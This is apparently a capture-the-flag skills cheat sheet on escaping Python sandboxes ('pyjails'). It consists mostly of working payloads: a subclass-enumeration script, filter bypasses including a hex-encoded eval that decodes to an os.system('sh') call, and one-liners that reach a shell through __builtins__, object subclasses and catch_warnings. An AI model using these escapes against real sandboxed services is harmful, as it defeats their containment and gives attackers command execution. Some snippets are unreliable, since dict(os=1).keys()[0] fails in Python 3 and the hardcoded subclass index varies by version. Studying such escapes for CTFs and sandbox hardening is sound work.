# PyJail Sandbox Escape (skills/misc/pyjail-escape.md)

## 1. Automated Subclass Search Script

Find `os.system` / `subprocess.Popen` / `_wrap_close` across all loaded classes:

```python
# Run locally in python environment:
for i, c in enumerate(().__class__.__base__.__subclasses__()):
    name = str(c)
    if 'os._wrap_close' in name or 'Popen' in name or 'FileLoader' in name:
        print(f"[{i}] {name}")
```

---

## 2. Common Filter Bypasses

### 2.1 Blocked Quotes (`'`, `"`)
- `chr(111)+chr(115)` $\rightarrow$ `'os'`
- `bytes([111, 115]).decode()` $\rightarrow$ `'os'`
- `dict(os=1).keys()[0]` $\rightarrow$ `'os'`

### 2.2 Blocked Underscores (`_`)
- `getattr(getattr(globals(), '__builtins__'), '__import__')`
- In Python 3: `eval(bytes.fromhex('5f5f696d706f72745f5f28276f7327292e73797374656d282773682729').decode())`

### 2.3 Blocked Letters / Digits
- Digits from bools: `True + True = 2`, `(True == True) = 1`, `(False == True) = 0`.
- Character synthesis via docstrings: `().__doc__[19]`

---

## 3. Universal One-Liners

```python
# 1. Via __builtins__
__builtins__.__import__('os').system('sh')

# 2. Via subclasses
().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['system']('sh')

# 3. Via sys.modules
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('sh')
```
